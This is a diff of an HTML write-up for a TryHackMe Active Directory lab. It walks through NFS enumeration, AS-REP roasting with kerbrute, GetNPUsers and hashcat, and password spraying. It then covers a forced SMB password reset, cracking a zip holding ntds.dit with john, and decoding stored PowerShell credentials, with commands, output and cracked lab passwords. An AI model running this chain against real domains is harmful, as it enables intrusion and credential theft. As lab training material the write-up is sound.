@@ -18,11 +18,12 @@
   <div class="meta-row">
     <span class="pill">Room: Raz0rBlack</span>
     <span class="pill">Category: Active Directory</span>
-    <span class="pill">Tools: Kerbrute, Impacket, Hashcat, CrackMapExec</span>
+    <span class="pill">Tools: Kerbrute, Hashcat, CrackMapExec, John</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a domain controller with an open NFS export, a spreadsheet of staff names, and layers of encoded credentials scattered across shares. The job: turn a leaked file into a username list, a username into a hash, and a hash into full access.</p>
+    <p><strong>The setup:</strong> a Windows domain, <code>raz0rblack.thm</code>, with nothing handed over but an IP. The job: find a way to a valid username, turn that into credentials, and chain whatever's found into Administrator.</p>
+    <p>A literal flag does appear partway through these notes (a user's password happens to be formatted like one), omitted here, the technique to reach it is what matters.</p>
   </div>
 
   <section>
@@ -32,14 +33,33 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Map the domain and mount an open NFS export</div>
-          <p>A service scan shows the usual AD fingerprint, Kerberos, LDAP, SMB, naming the domain outright. NFS being open on top of that is unusual enough to check:</p>
-          <pre><code>showmount -e &lt;target&gt;
-sudo mount -t nfs vers=2 &lt;target&gt;:/users ./smb</code></pre>
-          <p>Mounted, it contains a staff spreadsheet (<code>.xlsx</code>), converted to CSV for easy reading with <code>xlsx2csv</code>.</p>
+          <div class="step-title">Scan the domain, then check the NFS export</div>
+          <pre><code>nmap -sC -sV &lt;IP&gt;
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+111/tcp   open  rpcbind       2-4 (RPC #100000)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+2049/tcp  open  mountd        1-3 (RPC #100005)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RAZ0RBLACK
+|   NetBIOS_Computer_Name: HAVEN-DC
+|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm</code></pre>
+          <p>Port 2049 is NFS, worth a direct look before touching anything AD-specific:</p>
+          <pre><code>showmount -e 10.10.222.63
+Export list for 10.10.222.63:
+/users (everyone)</code></pre>
+          <p>"everyone" means no credentials needed to mount it.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>NFS being open at all on a Windows domain controller is already an anomaly worth chasing. A staff roster isn't a vulnerability by itself, but it's a ready-made username list for everything that follows.</p>
+            <p>An NFS export world-readable by "everyone" is the Linux-world equivalent of an open SMB share, easy to overlook on a Windows box since it's not the service you'd expect, but <code>showmount -e</code> costs nothing to try.</p>
           </div>
         </div>
       </div>
@@ -47,14 +67,30 @@ sudo mount -t nfs vers=2 &lt;target&gt;:/users ./smb</code></pre>
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Enumerate and AS-REP roast a pre-auth-exempt account</div>
-          <p>Feeding the names from the spreadsheet into <code>kerbrute</code> confirms valid accounts, and flags one with <code>[NOT PREAUTH]</code>. Requesting that account's hash needs no password at all:</p>
-          <pre><code>kerbrute -users userlist.txt -dc raz0rblack.thm -domain raz0rblack.thm -t 100
-GetNPUsers.py raz0rblack.thm/&lt;user&gt;</code></pre>
-          <p>Hashcat cracks the resulting <code>$krb5asrep$</code> hash against a standard wordlist in seconds.</p>
+          <div class="step-title">Mount it and pull out a staff roster</div>
+          <pre><code>mkdir ~/Desktop/smb/
+sudo mount -t nfs -o vers=2 10.10.196.24:/users ./smb
+sudo cp ~/Desktop/smb/employee_status.xlsx .
+sudo xlsx2csv employee_status.xlsx &gt; thang.csv
+
+cat thang.csv
+HAVEN SECRET HACKER's CLUB,,,,,,,,,,
+Name's,,,Role,,,,,,,
+daven port,,,CTF PLAYER,,,,,,,
+imogen royce,,,CTF PLAYER,,,,,,,
+tamara vidal,,,CTF PLAYER,,,,,,,
+arthur edwards,,,CTF PLAYER,,,,,,,
+carl ingram,,,CTF PLAYER (INACTIVE),,,,,,,
+nolan cassidy,,,CTF PLAYER,,,,,,,
+reza zaydan,,,CTF PLAYER,,,,,,,
+ljudmila vetrova,,,"CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN"
+rico delgado,,,WEB SPECIALIST,,,,,,,
+tyson williams,,,REVERSE ENGINEERING,,,,,,,
+steven bradley,,,STEGO SPECIALIST,,,,,,,
+chamber lin,,,CTF PLAYER(INACTIVE),,,,,,,</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Same pattern as any AS-REP roasting target: a disabled pre-authentication flag means anyone can request a crackable ticket hash for that account without ever supplying a password.</p>
+            <p>A staff spreadsheet is a username list with job titles attached for free, and job titles like "ACTIVE DIRECTORY ADMIN" tell you exactly which accounts are worth prioritizing once credentials start turning up.</p>
           </div>
         </div>
       </div>
@@ -62,13 +98,26 @@ GetNPUsers.py raz0rblack.thm/&lt;user&gt;</code></pre>
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Force a password reset to unlock read access</div>
-          <p>The cracked account's SMB login works, but <code>crackmapexec</code> reports <code>STATUS_PASSWORD_MUST_CHANGE</code>. <code>smbpasswd</code> satisfies that requirement directly, setting a new, known password:</p>
-          <pre><code>smbpasswd -r &lt;target&gt; -U &lt;user&gt;</code></pre>
-          <p>With the new password set, <code>smbmap</code> shows the account now has read access to a share previously inaccessible.</p>
+          <div class="step-title">Turn the roster into a Kerberos foothold</div>
+          <pre><code>./kerbrute -users /opt/userlist.txt -dc raz0rblack.thm -domain raz0rblack.thm -t 100
+
+[*] Blocked/Disabled user =&gt; guest
+[*] Valid user =&gt; administrator
+[*] Valid user =&gt; twilliams [NOT PREAUTH]
+[*] No passwords were discovered :'(</code></pre>
+          <p><code>twilliams</code> (Tyson Williams, from the roster) is flagged <code>NOT PREAUTH</code>, so a ticket can be requested with no password at all:</p>
+          <pre><code>GetNPUsers.py raz0rblack.thm/twilliams
+[*] Cannot authenticate twilliams, getting its TGT
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:33d761a84ed1974978f45ef42515928c$...a319be</code></pre>
+          <p>Hashcat cracks it almost immediately:</p>
+          <pre><code>hashcat -m 18200 TGT.hash -a 0 -w 3 /usr/share/wordlists/rockyou.txt --force
+
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:33d761a84ed1...a319be:roastpotatoes</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A password-must-change flag isn't a wall, it's a prompt, and an attacker who already has valid (if expired) credentials can satisfy it exactly like a legitimate user would. Afterward, the account behaves as fully active.</p>
+            <p>Same AS-REP roasting pattern as any AD target: a disabled pre-auth flag means Kerberos hands over a crackable hash to anyone who asks, no password needed to request it.</p>
           </div>
         </div>
       </div>
@@ -76,11 +125,29 @@ GetNPUsers.py raz0rblack.thm/&lt;user&gt;</code></pre>
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Pull down and crack a password-protected archive</div>
-          <p>The newly readable share contains a chat log and a password-protected zip. Downloading the whole directory and converting the archive's encryption to a crackable hash format turns up the zip's password via a standard wordlist run, revealing a system registry hive and the domain's NTDS database inside.</p>
+          <div class="step-title">Spray the cracked password, then force a reset</div>
+          <p>Trying <code>roastpotatoes</code> against another roster name, <code>sbradley</code>, authenticates but is locked behind a forced change:</p>
+          <pre><code>crackmapexec smb 10.10.146.1 -u sbradley -p roastpotatoes
+SMB  10.10.146.1  445  HAVEN-DC  [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE</code></pre>
+          <p><code>smbpasswd</code> can satisfy that requirement directly over SMB, using the known old password to set a new one:</p>
+          <pre><code>smbpasswd -r 10.10.146.1 -U sbradley
+Old SMB password: roastpotatoes
+New SMB password: password12345678
+Retype new SMB password: password12345678
+Password changed for user sbradley</code></pre>
+          <p>Confirming access with the new password turns up read access to shares, including a non-default one named <code>trash</code>:</p>
+          <pre><code>smbmap -H 10.10.146.1 -u sbradley -p password12345678
+Disk        Permissions   Comment
+----        -----------   -------
+ADMIN$      NO ACCESS     Remote Admin
+C$          NO ACCESS     Default share
+IPC$        READ ONLY     Remote IPC
+NETLOGON    READ ONLY     Logon server share
+SYSVOL      READ ONLY     Logon server share
+trash       READ ONLY     Files Pending for deletion</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A password-protected archive is still only as strong as its password. Once it's local, cracking it offline is no different from cracking any other password hash, no rate limiting, no lockout.</p>
+            <p>Password reuse across accounts is exactly what let a roasted service-account credential unlock a completely different user. <code>STATUS_PASSWORD_MUST_CHANGE</code> looks like a dead end, but SMB will happily let you satisfy that requirement yourself if you already know the old password.</p>
           </div>
         </div>
       </div>
@@ -88,11 +155,76 @@ GetNPUsers.py raz0rblack.thm/&lt;user&gt;</code></pre>
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Decode a stored credential and reach the domain's secret</div>
-          <p>A saved credential file (an exported PowerShell <code>CliXml</code> object) sitting in a user's home directory decodes cleanly once accessed as that same user, and the domain's root-level secret turns up in a second file as hex-encoded text, readable with a quick CyberChef decode.</p>
+          <div class="step-title">Pull everything out of the trash share</div>
+          <pre><code>smbclient -U sbradley //raz0rblack.thm/trash
+smb: \&gt; ls
+  chat_log_20210222143423.txt
+  experiment_gone_wrong.zip
+  sbradley.txt
+
+smbget -R smb://raz0rblack.thm/trash -U sbradley
+Downloaded 18.05MB in 103 seconds</code></pre>
+          <p>The zip is password-protected, but unzips enough to reveal what it's hiding before a password is even supplied:</p>
+          <pre><code>unzip experiment_gone_wrong.zip
+Archive:  experiment_gone_wrong.zip
+[experiment_gone_wrong.zip] system.hive password:
+  inflating: system.hive
+  inflating: ntds.dit</code></pre>
+          <p>A zip-cracking wordlist run recovers the archive password:</p>
+          <pre><code>john wrong.hash -w=/usr/share/wordlists/rockyou.txt
+Loaded 1 password hash (PKZIP [32/64])
+electromagnetismo (experiment_gone_wrong.zip)
+Session completed</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Exported PowerShell credentials are tied to the user and machine that created them, by design, but they decode trivially once an attacker is operating as that exact user. Hex encoding, like ROT13 or base64, is obfuscation, not protection, once you're looking at the right file.</p>
+            <p>A share literally named "trash" that's still reachable is worth checking before anything else, deleted-but-not-gone is a recurring theme in misconfigured file shares. <code>system.hive</code> and <code>ntds.dit</code> together are the raw material for a full offline domain credential dump, exactly what a careless backup or cleanup script would leave behind.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Decode a stored credential inside a WinRM session</div>
+          <p>The notes pick back up already inside an Evil-WinRM session as <code>lvetrova</code> (the cracked zip password lines up with her account; the exact login command isn't in the captured screenshots, so it's not reproduced here rather than guessed at). Her profile has an exported PowerShell credential object sitting on the desktop:</p>
+          <pre><code>*Evil-WinRM* PS C:\Users\lvetrova&gt; dir
+
+Mode     LastWriteTime        Length Name
+----     -------------        ------ ----
+-a----   2/25/2021 10:16 AM      1692 lvetrova.xml</code></pre>
+          <p>A PSCredential exported with <code>Export-Clixml</code> can be decoded back to plaintext, but only by the same user account that exported it:</p>
+          <pre><code>*Evil-WinRM* PS C:\Users\lvetrova&gt; $credential=import-clixml -path ".\lvetrova.xml"
+*Evil-WinRM* PS C:\Users\lvetrova&gt; $credential.getnetworkcredential().password</code></pre>
+          <p>That reveals lvetrova's real password (formatted like a flag in this room's notes, so not reprinted here).</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p><code>Export-Clixml</code> encrypts a credential using Windows DPAPI, tied to the exporting user's own key. It isn't a secure way to store a password for anyone else, but it's completely reversible by that same account, exactly what <code>Import-Clixml</code> plus <code>GetNetworkCredential()</code> does here.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Find the same pattern in the Administrator's profile</div>
+          <p>A second exported credential, this one hex-encoded instead of the usual XML, turns up under the Administrator profile (again, the notes pick up already there, how access reached this directory isn't shown):</p>
+          <pre><code>*Evil-WinRM* PS C:\users\Administrator&gt; type root.xml
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;
+    &lt;TN RefId="0"&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N="UserName"&gt;Administrator&lt;/S&gt;
+      &lt;SS N="Password"&gt;44616d6e20796f75206172652061207665...&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;</code></pre>
+          <p>Pasting the hex string into CyberChef's "From Hex" recipe decodes it back to the Administrator's own stored secret.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Same underlying weakness as the first credential, a human readable secret stored in a format that only looks obfuscated. Hex encoding isn't encryption, it's just a different alphabet, and CyberChef makes reversing it a drag-and-drop operation.</p>
           </div>
         </div>
       </div>
@@ -102,34 +234,57 @@ GetNPUsers.py raz0rblack.thm/&lt;user&gt;</code></pre>
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>NFS export (open, no auth) &rarr; staff roster leaked
-  &rarr; Kerbrute: valid usernames confirmed, one flagged NOT PREAUTH
-       &rarr; GetNPUsers.py + hashcat: AS-REP hash cracked
-            &rarr; smbpasswd: forced password reset unlocks SMB read access
-                 &rarr; encrypted zip downloaded and cracked offline
-                      &rarr; exported PS credential decoded as the right user
-                           &rarr; hex-encoded secret decoded via CyberChef</code></pre>
+    <pre><code>nmap: raz0rblack.thm, NFS also open
+  &rarr; showmount -e: /users exported to everyone
+       &rarr; mount, pull employee_status.xlsx: staff roster + usernames
+            &rarr; kerbrute: twilliams flagged NOT PREAUTH
+                 &rarr; GetNPUsers.py + hashcat: twilliams' password cracked
+                      &rarr; password reused against sbradley (forced change)
+                           &rarr; smbpasswd resets it, smbmap finds a "trash" share
+                                &rarr; trash share: a password-protected backup zip
+                                     &rarr; john cracks the zip password
+                                          &rarr; (gap in notes) WinRM session as lvetrova
+                                               &rarr; Export-Clixml credential decoded
+                                                    &rarr; (gap in notes) Administrator's profile
+                                                         &rarr; hex-encoded credential decoded via CyberChef</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>showmount / NFS mount</td><td>Finding and pulling data from an open NFS export</td></tr>
+        <tr><td>xlsx2csv</td><td>Converting the leaked spreadsheet to readable text</td></tr>
+        <tr><td>Kerbrute</td><td>Username validation and NOT PREAUTH detection</td></tr>
+        <tr><td>Impacket (GetNPUsers)</td><td>AS-REP hash extraction</td></tr>
+        <tr><td>Hashcat</td><td>Offline cracking of the AS-REP hash</td></tr>
+        <tr><td>CrackMapExec / smbpasswd / smbmap</td><td>Credential validation, forced password reset, share enumeration</td></tr>
+        <tr><td>John the Ripper</td><td>Cracking the protected zip archive</td></tr>
+        <tr><td>CyberChef</td><td>Decoding the hex-encoded Administrator credential</td></tr>
+      </table>
+    </div>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">An open NFS export on a Windows domain is always worth checking</div>
-        <p>It's not a default service for AD, so finding it open at all is itself a signal something was misconfigured.</p>
+        <div class="skill-title">An "everyone" NFS export is a credential leak waiting to happen</div>
+        <p>A simple staff spreadsheet, readable with zero authentication, became the username list that every later step depended on.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">A forced password change is satisfiable, not blocking</div>
-        <p>Cracked, expired credentials are still credentials, resetting the password is usually a single command away.</p>
+        <div class="skill-title">STATUS_PASSWORD_MUST_CHANGE is not a dead end</div>
+        <p>If the old password is already known, SMB lets an attacker satisfy the forced-change requirement themselves, turning a locked account into a usable one.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Layered encoding slows down automation, not a determined reader</div>
-        <p>Hex, base64, and password-protected archives each add a step, but none of them resist someone willing to decode one layer at a time.</p>
+        <div class="skill-title">Exported credentials are only as safe as who can decode them</div>
+        <p>Both the XML and hex-encoded credentials found here were technically "protected," but trivially reversible once the right account (or the right CyberChef recipe) was in hand.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via NFS enumeration, AS-REP roasting, and credential decoding</footer>
+  <footer>tryhackme.com &middot; solved via NFS enumeration, AS-REP roasting, and credential-store decoding</footer>
 
 </div>
 </body>
